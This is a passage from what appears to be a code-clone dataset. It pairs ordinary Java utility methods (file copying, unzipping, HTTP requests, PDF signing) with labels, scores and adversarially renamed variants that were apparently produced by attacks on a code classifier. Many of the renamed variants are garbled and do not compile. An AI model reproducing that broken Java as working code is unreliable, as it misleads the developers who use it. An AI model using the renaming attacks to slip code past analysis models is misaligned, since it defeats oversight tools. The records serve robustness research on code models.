                filePath += META_DATA_FILE_SUFIX;
            }
        }
        URL str = new URL(PROTOCOL_PREFIX + username + "":"" + password + ""@"" + server + filePath + "";type=i"");
        URLConnection downloadci = str.openConnection(BackEnd.getProxy(Proxy.Type.SOCKS));
        downloadci.setConnectTimeout(Preferences.getInstance().preferredTimeOut * 1000);
        downloadci.setReadTimeout(Preferences.getInstance().preferredTimeOut * 1000);
        OutputStream os = dosnloadci.getOutputStream();
        ByteArrayInputStream bis = new ByteArrayInputStream(data);
        byte[] buffer = new byte[1024];
        int br;
        while ((br = bis.read(buffer)) > 0) {
            os.write(buffer, 0, br);
            if (!transferMetaData) {
                transendedByteMon += br;
                ElapseValue = System.currentTimeMillis() - startTime;
                fireOnProgressEvent(transendedByteMon, ElapseValue);
            }
        }
        bis.close();
        os.close();
    }
",LABEL_0,LABEL_0,0.7730144262313843,1,"writeData,data,options,transferMetaData,startTime,transferredBytesNum,elapsedTime,opts,server,username,password,filePath,idx,fileName,url,urlc,os,bis,buffer,br",,,,40,"writeData:writeData,data:data,options:headers,transferMetaData:transferMetaData,startTime:startTime,transferredBytesNum:transendedByteMon,elapsedTime:ElapseValue,opts:obter,server:server,username:username,password:password,filePath:filePath,idx:idx,fileName:FileName,url:str,urlc:downloadci,os:os,bis:bis,buffer:buffer,br:br,",13,GA,1198,0.4513760765393575,ga,[]
120,"    public static void copyFromTo(File srcFile, File destFile) {
        FileChannel in = null, out = null;
        FileInputStream fis = null;
        FileOutputStream fos = null;
        try {
            fis = new FileInputStream(srcFile);
        } catch (FileNotFoundException fnfe) {
            System.out.println(""File: "" + srcFile.toString());
            System.out.println(""file does not exist, "" + ""is a directory rather than a regular file, "" + ""or for some other reason cannot be opened for reading"");
            System.exit(-1);
        }
        try {
            fos = new FileOutputStream(destFile);
        } catch (FileNotFoundException fnfe) {
            System.out.println(""File: "" + destFile.toString());
            System.out.println(""file exists but is a directory rather than a regular file, "" + ""does not exist but cannot be created, "" + ""or cannot be opened for any other reason"");
            System.exit(-1);
        }
        try {
            in = fis.getChannel();
            out = fos.getChannel();
            in.transferTo(0, in.size(), out);
            fos.flush();
            fos.close();
            out.close();
            fis.close();
            in.close();
            System.out.println(""Completed copying "" + srcFile.toString() + "" to "" + destFile.toString());
        } catch (IOException ioe) {
            System.out.println(""IOException copying file: "" + ioe.getMessage());
            System.exit(-1);
        }
        long srcModified = srcFile.lastModified();
        if (srcModified > 0L && destFile.exists()) {
            destFile.setLastModified(srcModified);
        }
    }
 <SPLIT>     public static void extractFile(String input, String output) throws ZipException, IOException {
        FileReader reader = new FileReader(input);
        InputStream in = reader.getInputStream();
        OutputStream out = new FileOutputStream(new File(output));
        byte[] buf = new byte[512];
        int len;
        while ((len = in.read(buf)) > 0) out.write(buf, 0, len);
        reader.close();
        out.close();
    }
",310,"    public static void transferfromTo(File destClass, File destroyFile) {
        FileChannel in = null, url = null;
        FileInputStream  foss = null;
        FileOutputStream fos = null;
        try {
            fi foss new FileInputStream(destClass);
        } catch (FileNotFoundException fnfe) {
            System.ouurlrintln(""File: "" + destClass.toString());
            System.url.println(""file does not exist, "" + ""is a directory rather than a regular file, "" + ""or for some other reason cannot be opened for reading"");
            System.exit(-1);
        }
        try {
            fosfosnew FileOutputStream(destroyFile);
        } catch (FileNotFoundException fnfe) {
            System.outurlintln(""File: "" + destroyFile.toString());
            System.url.println(""file exists but is a directory rather than a regular file, "" + ""does not exist but cannot be created, "" + ""or cannot be opened for any other reason"");
            System.exit(-1);
        }
        try {
            in =  foss.getChannel();
            url = fos.getChannel();
            in.transferTo(0, in.size(), url);
            fos.flush();
            fos.close();
            url.close();
             foss.close();
            in.close();
            System.out.purltln(""Completed copying "" + destClass.toString() + "" to "" + destroyFile.toString());
        } catch (IOException ioe) {
            System.url.println(""IOException copying file: "" + ioe.getMessage());
            System.exit(-1);
        }
        long srsrcModified destClass.lastModified();
        if (srcsrcModified0L && destroyFile.exists()) {
            destroyFile.setLastModified(srcModified);
        }
    }
",LABEL_1,LABEL_1,0.5275697708129883,1,"copyFromTo,srcFile,destFile,in,out,fis,fos,srcModified",,,,13,"copyFromTo:transferfromTo,srcFile:destClass,destFile:destroyFile,in:in,out:url,fis: foss,fos:fos,srcModified:srcModified,",3,GA,509,0.18785223563512166,ga,[]
121,"    private void upgradeSchema() throws IOException {
        Statement stmt = null;
        try {
            int i = getSchema();
            LOG.info(""DB is currently at schema "" + i);
            if (i < SCHEMA_VERSION) {
                LOG.info(""Upgrading from schema "" + i + "" to schema "" + SCHEMA_VERSION);
                conn.setAutoCommit(false);
                stmt = conn.createStatement();
                while (i < SCHEMA_VERSION) {
                    String qry;
                    switch(i) {
                        case 1:
                            qry = ""UPDATE settings SET val = '2' WHERE var = 'schema'"";
                            stmt.executeUpdate(qry);
                            break;
                    }
                    i++;
                }
                conn.commit();
            }
        } catch (SQLException e) {
            try {
                conn.rollback();
            } catch (SQLException e2) {
                LOG.error(SQL_ERROR, e2);
            }
            LOG.fatal(SQL_ERROR, e);
            throw new IOException(""Error upgrading data store"", e);
        } finally {
            try {
                if (stmt != null) stmt.close();
                conn.setAutoCommit(true);
            } catch (SQLException e) {
                LOG.error(SQL_ERROR, e);
                throw new IOException(""Unable to cleanup SQL resources"", e);
            }
        }
    }
 <SPLIT>     @Override
    protected <T> T execute(final HttpMethod method, final String url, Parameters parameters, final Handler<T> handler) throws FoursquareException {
        HttpURLConnection connection = null;
        try {
            switch(method) {
                case GET:
                    connection = openConnection(url.concat(""?"").concat(formEncode(parameters)));
                    connection.setRequestMethod(""GET"");
                    connection.connect();
                    break;
                case POST:
                    connection = openConnection(url);
                    connection.setRequestMethod(""POST"");
                    connection.setDoOutput(true);
                    connection.setRequestProperty(""Content-Type"", ""application/x-www-form-urlencoded"");
                    connection.connect();
                    final OutputStream out = connection.getOutputStream();
                    out.write(formEncode(parameters).getBytes());
                    out.flush();
                    out.close();
                    break;
            }
            final int statusCode = connection.getResponseCode();
            if (statusCode / 100 != 2) {
                final Error error = parseBody(connection.getErrorStream(), new ErrorHandler());
                if (error == null) throw new FoursquareException(connection.getResponseMessage()); else if (""error"".equals(error.getType())) throw new FoursquareException(error.getMessage()); else if (""unauthorized"".equals(error.getType())) throw new AuthenticationException(error.getMessage()); else if (""ratelimited"".equals(error.getType())) throw new RateLimitingException(error.getMessage()); else throw new FoursquareException(connection.getResponseMessage());
            }
            return parseBody(connection.getInputStream(), handler);
        } catch (final IOException e) {
            throw new FoursquareException(e);
        } catch (final ParserConfigurationException e) {
            throw new FoursquareException(e);
        } catch (final SAXException e) {
            throw new FoursquareException(e);
        } finally {
            if (connection != null) connection.disconnect();
        }
    }
",225,,LABEL_0,LABEL_0,LABEL_0,-1,"upgradeSchema,stmt,i,qry",,,,0,,0,GA,1566,0.5823418021202087,failed,[]
122,"    private void unzip(File filename) throws ZipException, IOException {
        ZipInputStream in = new ZipInputStream(new BufferedInputStream(new FileInputStream(filename)));
        ZipEntry entry = null;
        boolean first_entry = true;
        while ((entry = in.getNextEntry()) != null) {
            if (first_entry) {
                if (!entry.isDirectory()) {
                    File subdir = new File(dir + File.separator + filename.getName().substring(0, filename.getName().length() - SUFFIX_ZIP.length()));
                    if (!subdir.exists()) {
                        subdir.mkdir();
                        dir = subdir;
                    }
                }
                first_entry = false;
            }
            if (entry.isDirectory()) {
                FileUtils.forceMkdir(new File(dir + File.separator + entry.getName()));
            } else {
                File outfile = new File(dir + File.separator + entry.getName());
                File outdir = new File(outfile.getAbsolutePath().substring(0, outfile.getAbsolutePath().length() - outfile.getName().length()));
                if (!outdir.exists()) FileUtils.forceMkdir(outdir);
                FileOutputStream fo = new FileOutputStream(outfile);
                BufferedOutputStream bos = new BufferedOutputStream(fo, BUFFER);
                int read;
                byte data[] = new byte[BUFFER];
                while ((read = in.read(data, 0, BUFFER)) != -1) {
                    read_position++;
                    bos.write(data, 0, read);
                }
                bos.flush();
                bos.close();
            }
        }
        in.close();
    }
 <SPLIT>     private void startScript(wabclient.Attributes prop) throws SAXException {
        dialog.beginScript();
        String url = prop.getValue(""src"");
        if (url.length() > 0) {
            try {
                BufferedReader r = new BufferedReader(new InputStreamReader(new URL(url).openStream()));
                String buffer;
                while (true) {
                    buffer = r.readLine();
                    if (buffer == null) break;
                    dialog.script += buffer + ""\n"";
                }
                r.close();
                dialog.endScript();
            } catch (IOException ioe) {
                System.err.println(""[IOError] "" + ioe.getMessage());
                System.exit(0);
            }
        }
    }
",334,"    private void Unarchive(File url) throws ZipException, IOException {
        ZipInputStieam in = new ZipInputStream(new BufferedInputStream(new FileInputStream(url)));
        ZipEntry line = null;
        boolean  first_reader = true;
        while ((line = ie.getNextEntry()) != null) {
            if ( first_reader) {
                if (!line.isDirectory()) {
               partDirile subdir =lockw File(dir + File.separator + url.getName().substring(0, url.getName().length() - SUFFIX_ZIP.length()));
                    if (!partDir.exists()) {
                        partDir.mkdir();
                        dlock= partDir;
                    }
                }
                 first_reader = false;
            }
            if (line.isDirectory()) {
                FileUtils.forceMkdir(new Filelockr + File.separator + line.getName()));
            } else {
                File  outfiles = new Filelockr + File.separator + line.getName());
                File outdirinfile File( outfiles.getAbsolutePath().substring(0,  outfiles.getAbsolutePath().length() -  outfiles.getName().length()));
                if (!infile.exists()) FileUtils.forceMkdir(infile);
                FileOutputStream fogio new FileOutputStream( outfiles);
                BufferedOutputStream bdos= new BufferedOutputStream(gio, BUFFER);
                int buffer;
                byte data[] = new byte[BUFFER];
                while ((buffer = ie.buffer(data, 0, BUFFER)) != -1) {
                    read_length++;
                    dos.write(dadata0, buffer);
                }
                dos.flush();
                dos.close();
            }
        }
        ie.close();
    }
",LABEL_0,LABEL_0,0.5013547539710999,1,"unzip,filename,in,entry,first_entry,subdir,dir,outfile,outdir,fo,bos,read,data,read_position",,,,3,"unzip:Unarchive,filename:url,in:ie,entry:line,first_entry: first_reader,subdir:partDir,dir:lock,outfile: outfiles,outdir:infile,fo:gio,bos:dos,read:buffer,data:data,read_position:read_length,",1,GA,1266,0.46844282150268557,ga,[]
123,"    public static boolean encodeFileToFile(String infile, String outfile) {
        boolean success = false;
        java.io.InputStream in = null;
        java.io.OutputStream out = null;
        try {
            in = new Base64.InputStream(new java.io.BufferedInputStream(new java.io.FileInputStream(infile)), Base64.ENCODE);
            out = new java.io.BufferedOutputStream(new java.io.FileOutputStream(outfile));
            byte[] buffer = new byte[65536];
            int read = -1;
            while ((read = in.read(buffer)) >= 0) {
                out.write(buffer, 0, read);
            }
            success = true;
        } catch (java.io.IOException exc) {
            exc.printStackTrace();
        } finally {
            try {
                in.close();
            } catch (Exception exc) {
            }
            try {
                out.close();
            } catch (Exception exc) {
            }
        }
        return success;
    }
 <SPLIT>     public static SVNConfiguracion load(URL urlConfiguracion) {
        SVNConfiguracion configuracion = null;
        try {
            XMLDecoder xenc = new XMLDecoder(urlConfiguracion.openStream());
            configuracion = (SVNConfiguracion) xenc.readObject();
            configuracion.setFicheroConfiguracion(urlConfiguracion);
            xenc.close();
        } catch (Exception exception) {
            exception.printStackTrace();
        }
        return configuracion;
    }
",194,,LABEL_0,LABEL_0,LABEL_0,-1,"encodeFileToFile,infile,outfile,in,out,buffer,read,success",,,,0,,0,GA,3020,1.0793071945508321,failed,[]
124,"    private void doImageProcess(HttpServletRequest request, HttpServletResponse response) throws IOException {
        response.setContentType(""image/"" + type + """");
        Point imgSize = null;
        if (width > 0 || height > 0) {
            imgSize = new Point(width, height);
        }
        if (fmt != null && imageFormats.containsKey(fmt)) {
            imgSize = imageFormats.get(fmt);
        }
        InputStream imageInputStream = inputStream != null ? inputStream : imageUrl.openStream();
        if (imageInputStream == null) {
            throw new RuntimeException(""File "" + imageUrl + "" does not exist!"");
        }
        if (imgSize == null) {
            IOUtils.copy(imageInputStream, response.getOutputStream());
        } else {
            byte[] imageBytes = getImageBytes(type, imgSize, imageInputStream);
            response.setContentLength(imageBytes.length);
            response.getOutputStream().write(imageBytes);
        }
        response.getOutputStream().flush();
        response.getOutputStream().close();
    }
 <SPLIT>     private String encryptPassword(String password) throws NoSuchAlgorithmException {
        StringBuffer encryptedPassword = new StringBuffer();
        MessageDigest md5 = MessageDigest.getInstance(""MD5"");
        md5.reset();
        md5.update(password.getBytes());
        byte digest[] = md5.digest();
        for (int i = 0; i < digest.length; i++) {
            String hex = Integer.toHexString(0xFF & digest[i]);
            if (hex.length() == 1) {
                encryptedPassword.append('0');
            }
            encryptedPassword.append(hex);
        }
        return encryptedPassword.toString();
    }
",196,,LABEL_0,LABEL_0,LABEL_0,-1,"doImageProcess,request,response,imgSize,imageInputStream,imageBytes",,,,0,,0,GA,2210,0.7970920205116272,failed,[]
125,"    @SuppressWarnings({ ""ResultOfMethodCallIgnored"" })
    public static Node combineJs(URL base, List<Node> linkJs, List<File> newFiles) throws IOException {
        File dir = File.createTempFile(""javascript"", """" + System.currentTimeMillis());
        StringBuilder name = new StringBuilder();
        try {
            if (dir.delete() && dir.mkdirs()) {
                File minDir = new File(dir, ""min"");
                minDir.mkdir();
                File combineFile = new File(minDir, ""script.js"");
                File concatFile = new File(minDir, ""concat.js"");
                Writer combineWriter = new FileWriter(combineFile);
                Writer concatWriter = new FileWriter(concatFile);
                final List<Boolean> fails = new LinkedList<Boolean>();
                boolean first = true;
                for (Node link : linkJs) {
                    String path = ((Element) link).getAttribute(""src"");
                    URL url = new URL(buildUrl(base, path));
                    InputStream inputStream = url.openStream();
                    File jsFile = new File(dir, fileName(url));
                    FileOutputStream outputStream = new FileOutputStream(jsFile);
                    IOUtils.copy(inputStream, outputStream);
                    outputStream.close();
                    inputStream.close();
                    if (!first) {
                        combineWriter.write(""\n;\n"");
                        concatWriter.write(""\n;\n"");
                    } else {
                        first = false;
                    }
                    if (Configuration.jsMinification()) {
                        Reader reader = new FileReader(jsFile);
                        try {
                            JavaScriptCompressor jsCompressor = new JavaScriptCompressor(reader, new ErrorReporter() {

                                @Override
                                public void warning(String s, String s1, int i, String s2, int i1) {
                                    fails.add(true);
                                }

                                @Override
                                public void error(String s, String s1, int i, String s2, int i1) {
                                    fails.add(true);
                                }

                                @Override
                                public EvaluatorException runtimeError(String s, String s1, int i, String s2, int i1) {
                                    fails.add(true);
                                    return null;
                                }
                            });
                            jsCompressor.compress(combineWriter, 0, false, false, true, true);
                        } catch (Exception e) {
                            fails.add(true);
                        }
                        reader.close();
                    }
                    Reader reader = new FileReader(jsFile);
                    IOUtils.copy(reader, concatWriter);
                    reader.close();
                    String fileName = jsFile.getName();
                    int pos = fileName.lastIndexOf('.');
                    if (pos >= 0) {
                        fileName = fileName.substring(0, pos);
                    }
                    name.append(fileName).append("","");
                }
                combineWriter.close();
                concatWriter.close();
                FileReader reader;
                if (fails.size() == 0 && Configuration.jsMinification()) {
                    reader = new FileReader(combineFile);
                } else {
                    reader = new FileReader(concatFile);
                }
                name.append(hashCode(IOUtils.toString(reader))).append("".js"");
                reader.close();
                File targetFile = new File(Configuration.getJsLocalDir(), name.toString());
                if (!targetFile.exists()) {
                    targetFile.getParentFile().mkdirs();
                    if (fails.size() == 0 && Configuration.jsMinification()) {
                        FileUtils.copyFile(combineFile, targetFile);
                    } else {
                        FileUtils.copyFile(concatFile, targetFile);
                    }
                    newFiles.add(targetFile);
                    logger.info(""Combined several js files into the single "" + targetFile + "" [size="" + targetFile.length() + ""]."");
                }
            }
        } finally {
            FileUtils.deleteQuietly(dir);
        }
        if (name.length() != 0) {
            Element element = (Element) linkJs.get(0);
            element.setAttribute(""src"", Configuration.getJsUrlPrefix() + name.toString());
            return element;
        } else {
            return null;
        }
    }
 <SPLIT>     private static HttpURLConnection sendPost(String reqUrl, Map<String, String> parameters) {
        HttpURLConnection urlConn = null;
        try {
            String params = generatorParamString(parameters);
            URL url = new URL(reqUrl);
            urlConn = (HttpURLConnection) url.openConnection();
            urlConn.setRequestMethod(""POST"");
            urlConn.setConnectTimeout(5000);
            urlConn.setReadTimeout(5000);
            urlConn.setDoOutput(true);
            byte[] b = params.getBytes();
            urlConn.getOutputStream().write(b, 0, b.length);
            urlConn.getOutputStream().flush();
            urlConn.getOutputStream().close();
        } catch (Exception e) {
            throw new RuntimeException(e.getMessage(), e);
        }
        return urlConn;
    }
",790,,LABEL_0,LABEL_1,,-4,"combineJs,base,linkJs,newFiles,dir,name,minDir,combineFile,concatFile,combineWriter,concatWriter,fails,link,path,url,inputStream,jsFile,fileName,outputStream,first,reader,jsCompressor,s,s1,i,s2,i1",,,,0,,0,Greedy,1,0.0009304404258728028,,[]
126,"    public static int[] bubbleSort(int... a) {
        boolean swapped;
        do {
            swapped = false;
            for (int i = 0; i < a.length - 1; i++) {
                if (a[i] > a[i + 1]) {
                    int tmp = a[i];
                    a[i] = a[i + 1];
                    a[i + 1] = tmp;
                    swapped = true;
                }
            }
        } while (swapped);
        return a;
    }
 <SPLIT>     public static boolean check(String urlStr) {
        try {
            URL url = new URL(urlStr);
            HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
            urlConnection.setConnectTimeout(2000);
            urlConnection.getContent();
        } catch (Exception e) {
            logger.error(""There is no internet connection"", e);
            return false;
        }
        return true;
    }
",101,,LABEL_0,LABEL_0,LABEL_0,-1,"bubbleSort,a,swapped,i,tmp",,,,0,,0,GA,1829,0.6450364708900451,failed,[]
127,"    String fetch_pls(String pls) {
        InputStream pstream = null;
        if (pls.startsWith(""http://"")) {
            try {
                URL url = null;
                if (running_as_applet) {
                    url = new URL(getCodeBase(), pls);
                } else {
                    url = new URL(pls);
                }
                URLConnection urlc = url.openConnection();
                pstream = urlc.getInputStream();
            } catch (Exception ee) {
                System.err.println(ee);
                return null;
            }
        }
        if (pstream == null && !running_as_applet) {
            try {
                pstream = new FileInputStream(System.getProperty(""user.dir"") + System.getProperty(""file.separator"") + pls);
            } catch (Exception ee) {
                System.err.println(ee);
                return null;
            }
        }
        String line = null;
        while (true) {
            try {
                line = readline(pstream);
            } catch (Exception e) {
            }
            if (line == null) {
                break;
            }
            if (line.startsWith(""File1="")) {
                byte[] foo = line.getBytes();
                int i = 6;
                for (; i < foo.length; i++) {
                    if (foo[i] == 0x0d) {
                        break;
                    }
                }
                return line.substring(6, i);
            }
        }
        return null;
    }
 <SPLIT>     @Test
    public void test_lookupResourceType_FullSearch_TwoWordsInMiddle() throws Exception {
        URL url = new URL(baseUrl + ""/lookupResourceType/armor+plates"");
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod(""GET"");
        connection.setRequestProperty(""Accept"", ""application/json"");
        assertThat(connection.getResponseCode(), equalTo(200));
        assertThat(getResponse(connection), equalTo(""[{\""itemTypeID\"":25605,\""itemCategoryID\"":4,\""name\"":\""Armor Plates\"",\""icon\"":\""69_09\""},{\""itemTypeID\"":25624,\""itemCategoryID\"":4,\""name\"":\""Intact Armor Plates\"",\""icon\"":\""69_10\""}]""));
        assertThat(connection.getHeaderField(""Content-Type""), equalTo(""application/json; charset=utf-8""));
    }
",266,,LABEL_0,LABEL_0,LABEL_0,-1,"fetch_pls,pls,pstream,url,urlc,line,foo,i",,,,0,,0,GA,3018,1.1014648874600728,failed,[]
128,"    public static void main(String[] args) {
        System.out.println(""Chapter 16: example SignedPdf"");
        System.out.println(""-> Creates a signed PDF;"");
        System.out.println(""-> jars needed: iText.jar"");
        System.out.println(""-> files generated in /results subdirectory:"");
        System.out.println(""   Resource needed: .keystore"");
        System.out.println(""-> Resulting PDFs: unsigned_message.pdf, signed_message.pdf,"");
        System.out.println(""   corrupted_message.pdf, signed_message_invisible.pdf,"");
        System.out.println(""   double_signed_message.pdf, revision_1.pdf and revision_2.pdf"");
        createPdf();
        PdfReader reader;
        try {
            KeyStore ks = KeyStore.getInstance(KeyStore.getDefaultType());
            ks.load(new FileInputStream(""resources/in_action/chapter16/.keystore""), ""f00b4r"".toCharArray());
            PrivateKey key = (PrivateKey) ks.getKey(""foobar"", ""r4b00f"".toCharArray());
            Certificate[] chain = ks.getCertificateChain(""foobar"");
            reader = new PdfReader(""results/in_action/chapter16/unsigned_message.pdf"");
            FileOutputStream os = new FileOutputStream(""results/in_action/chapter16/signed_message.pdf"");
            PdfStamper stamper = PdfStamper.createSignature(reader, os, '\0');
            PdfSignatureAppearance appearance = stamper.getSignatureAppearance();
            appearance.setCrypto(key, chain, null, PdfSignatureAppearance.SELF_SIGNED);
            appearance.setCertificationLevel(PdfSignatureAppearance.CERTIFIED_FORM_FILLING);
            appearance.setReason(""It's personal."");
            appearance.setLocation(""Foobar"");
            appearance.setVisibleSignature(new Rectangle(30, 750, 500, 565), 1, null);
            stamper.close();
        } catch (KeyStoreException e) {
            e.printStackTrace();
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        } catch (CertificateException e) {
            e.printStackTrace();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (UnrecoverableKeyException e) {
            e.printStackTrace();
        } catch (DocumentException e) {
            e.printStackTrace();
        }
        try {
            reader = new PdfReader(""results/in_action/chapter16/signed_message.pdf"");
            Document document = new Document(reader.getPageSizeWithRotation(1));
            PdfCopy copy = new PdfCopy(document, new FileOutputStream(""results/in_action/chapter16/corrupted_message.pdf""));
            document.open();
            copy.addPage(copy.getImportedPage(reader, 1));
            document.close();
        } catch (IOException ioe) {
            ioe.printStackTrace();
        } catch (DocumentException de) {
            de.printStackTrace();
        }
        try {
            KeyStore ks = KeyStore.getInstance(KeyStore.getDefaultType());
            ks.load(new FileInputStream(""resources/in_action/chapter16/.keystore""), ""f00b4r"".toCharArray());
            PrivateKey key = (PrivateKey) ks.getKey(""foobar"", ""r4b00f"".toCharArray());
            Certificate[] chain = ks.getCertificateChain(""foobar"");
            reader = new PdfReader(""results/in_action/chapter16/unsigned_message.pdf"");
            FileOutputStream os = new FileOutputStream(""results/in_action/chapter16/signed_message_invisible.pdf"");
            PdfStamper stamper = PdfStamper.createSignature(reader, os, '\0');
            PdfSignatureAppearance appearance = stamper.getSignatureAppearance();
            appearance.setCrypto(key, chain, null, PdfSignatureAppearance.SELF_SIGNED);
            appearance.setReason(""It's personal."");
            appearance.setLocation(""Foobar"");
            stamper.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
        try {
            reader = new PdfReader(""results/in_action/chapter16/signed_message.pdf"");
            KeyStore ks = KeyStore.getInstance(KeyStore.getDefaultType());
            ks.load(new FileInputStream(""resources/in_action/chapter16/.keystore""), ""f00b4r"".toCharArray());
            PrivateKey key = (PrivateKey) ks.getKey(""foobar"", ""r4b00f"".toCharArray());
            Certificate[] chain = ks.getCertificateChain(""foobar"");
            FileOutputStream os = new FileOutputStream(""results/in_action/chapter16/double_signed_message.pdf"");
            PdfStamper stamper = PdfStamper.createSignature(reader, os, '\0', null, true);
            PdfSignatureAppearance appearance = stamper.getSignatureAppearance();
            appearance.setCrypto(key, chain, null, PdfSignatureAppearance.SELF_SIGNED);
            appearance.setReason(""Double signed."");
            appearance.setLocation(""Foobar"");
            appearance.setVisibleSignature(new Rectangle(300, 750, 500, 800), 1, ""secondsig"");
            stamper.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
        try {
            CertificateFactory cf = CertificateFactory.getInstance(""X509"");
            Collection col = cf.generateCertificates(new FileInputStream(""resources/in_action/chapter16/foobar.cer""));
            KeyStore ks = KeyStore.getInstance(KeyStore.getDefaultType());
            ks.load(null, null);
            for (Iterator it = col.iterator(); it.hasNext(); ) {
                X509Certificate cert = (X509Certificate) it.next();
                System.out.println(cert.getIssuerDN().getName());
                ks.setCertificateEntry(cert.getSerialNumber().toString(Character.MAX_RADIX), cert);
            }
            reader = new PdfReader(""results/in_action/chapter16/double_signed_message.pdf"");
            AcroFields af = reader.getAcroFields();
            ArrayList names = af.getSignatureNames();
            String name;
            for (Iterator it = names.iterator(); it.hasNext(); ) {
                name = (String) it.next();
                System.out.println(""Signature name: "" + name);
                System.out.println(""Signature covers whole document: "" + af.signatureCoversWholeDocument(name));
                System.out.println(""Document revision: "" + af.getRevision(name) + "" of "" + af.getTotalRevisions());
                FileOutputStream os = new FileOutputStream(""results/in_action/chapter16/revision_"" + af.getRevision(name) + "".pdf"");
                byte bb[] = new byte[8192];
                InputStream ip = af.extractRevision(name);
                int n = 0;
                while ((n = ip.read(bb)) > 0) os.write(bb, 0, n);
                os.close();
                ip.close();
                PdfPKCS7 pk = af.verifySignature(name);
                Calendar cal = pk.getSignDate();
                Certificate pkc[] = pk.getCertificates();
                System.out.println(""Subject: "" + PdfPKCS7.getSubjectFields(pk.getSigningCertificate()));
                System.out.println(""Document modified: "" + !pk.verify());
                Object fails[] = PdfPKCS7.verifyCertificates(pkc, ks, null, cal);
                if (fails == null) System.out.println(""Certificates verified against the KeyStore""); else System.out.println(""Certificate failed: "" + fails[1]);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
 <SPLIT>     private static void setup() throws Exception {
        String path = Webcam.class.getProtectionDomain().getCodeSource().getLocation().getFile();
        File jarFile = new File(URLDecoder.decode(path, ""UTF-8"") + ""/Hanasu.jar"");
        if (!jarFile.exists()) jarFile = new File(""/home/marc/Virtual Machine/Hanasu.jar"");
        File f = File.createTempFile(""tempabca"", ""bdfafad"");
        f.delete();
        f.mkdir();
        String parent = f.getAbsolutePath() + ""/"";
        byte[] buf = new byte[1024];
        ZipInputStream zipinputstream = null;
        ZipEntry zipentry;
        zipinputstream = new ZipInputStream(new FileInputStream(jarFile));
        zipentry = zipinputstream.getNextEntry();
        while (zipentry != null) {
            String entryName = zipentry.getName();
            if (entryName.startsWith(""native"")) {
                int n;
                FileOutputStream fileoutputstream;
                File newFile = new File(parent + entryName);
                if (zipentry.isDirectory()) {
                    newFile.mkdirs();
                    zipentry = zipinputstream.getNextEntry();
                    continue;
                }
                fileoutputstream = new FileOutputStream(newFile);
                while ((n = zipinputstream.read(buf, 0, 1024)) > -1) fileoutputstream.write(buf, 0, n);
                fileoutputstream.close();
                zipinputstream.closeEntry();
            }
            zipentry = zipinputstream.getNextEntry();
        }
        zipinputstream.close();
        String arch = """";
        boolean x64 = false;
        for (String key : keys) {
            String property = System.getProperty(key);
            if (property != null) {
                x64 = (property.indexOf(""64"") >= 0);
            }
        }
        if (JPTrayIcon.isUnix()) {
            if (x64) arch = ""linux-amd64""; else arch = ""linux-x86"";
        }
        if (JPTrayIcon.isWindows()) {
            System.out.println(""Arch: "" + System.getProperty(""sun.arch.data.model""));
            if (x64 && !System.getProperty(""sun.arch.data.model"").equals(""32"")) arch = ""win64-amd64""; else arch = ""win32-x86"";
        }
        if (JPTrayIcon.isMac()) arch = ""macosx-universal"";
        System.out.println(""Using native/"" + arch + ""/"");
        addLibraryPath(parent + ""native/"" + arch + ""/"");
    }
",1317,,LABEL_1,LABEL_1,LABEL_1,-1,"reader,ks,key,chain,os,stamper,appearance",,,,0,,0,GA,2566,1.2311234513918559,failed,[]
129,"    public static void copyFile(File sourceFile, File destFile) throws IOException {
        if (!destFile.exists()) {
            destFile.createNewFile();
        }
        FileChannel source = null;
        FileChannel destination = null;
        try {
            source = new FileInputStream(sourceFile).getChannel();
            destination = new FileOutputStream(destFile).getChannel();
            destination.transferFrom(source, 0, source.size());
        } finally {
            if (source != null) {
                source.close();
            }
            if (destination != null) {
                destination.close();
            }
        }
    }
 <SPLIT>     public boolean visar() throws SQLException, ClassNotFoundException, Exception {
        Connection conn = null;
        PreparedStatement ps = null;
        Date fechaSystem = new Date();
        DateFormat aaaammdd = new SimpleDateFormat(""yyyyMMdd"");
        DateFormat hhmmss = new SimpleDateFormat(""HHmmss"");
        DateFormat sss = new SimpleDateFormat(""S"");
        String ss = sss.format(fechaSystem);
        if (ss.length() > 2) {
            ss = ss.substring(0, 2);
        }
        boolean visado = false;
        try {
            conn = ToolsBD.getConn();
            conn.setAutoCommit(false);
            String sentenciaSql = ""UPDATE BZMODIF SET FZJCUSVI=?, FZJFVISA=?, FZJHVISA=?"" + ((hayVisadoExtracto) ? "", FZJIEXTR=?"" : """") + ((hayVisadoRemitente) ? "", FZJIREMI=?"" : """") + "" WHERE FZJCENSA='S' AND FZJCAGCO=? AND FZJNUMEN=? AND FZJANOEN=? AND FZJFMODI=? AND FZJHMODI=?"";
            ps = conn.prepareStatement(sentenciaSql);
            ps.setString(1, usuarioVisado);
            ps.setInt(2, Integer.parseInt(aaaammdd.format(fechaSystem)));
            ps.setInt(3, Integer.parseInt(hhmmss.format(fechaSystem) + ss));
            int contador = 4;
            if (hayVisadoExtracto) {
                ps.setString(contador++, ""X"");
            }
            if (hayVisadoRemitente) {
                ps.setString(contador++, ""X"");
            }
            ps.setInt(contador++, oficina);
            ps.setInt(contador++, numeroRegistro);
            ps.setInt(contador++, anoSalida);
            ps.setString(contador++, fechaModificacion);
            ps.setString(contador++, horaModificacion);
            int registrosAfectados = ps.executeUpdate();
            if (registrosAfectados > 0 && !hayVisadoExtracto && !hayVisadoRemitente) {
                visado = true;
            }
            if (registrosAfectados > 0 && (hayVisadoExtracto || hayVisadoRemitente)) {
                boolean generado = generarBZVISAD(conn, Integer.parseInt(aaaammdd.format(fechaSystem)), Integer.parseInt(hhmmss.format(fechaSystem) + ss));
                if (generado) {
                    visado = actualizarBZSALIDA(conn);
                }
                String rem = """";
                String com = """";
                if (hayVisadoRemitente) {
                    if (!remitente.trim().equals("""")) {
                        rem = remitente;
                    } else {
                        javax.naming.InitialContext contexto = new javax.naming.InitialContext();
                        Object ref = contexto.lookup(""es.caib.regweb.ValoresHome"");
                        ValoresHome home = (ValoresHome) javax.rmi.PortableRemoteObject.narrow(ref, ValoresHome.class);
                        Valores valor = home.create();
                        rem = valor.recuperaRemitenteCastellano(entidad1, entidad2 + """");
                        valor.remove();
                    }
                } else {
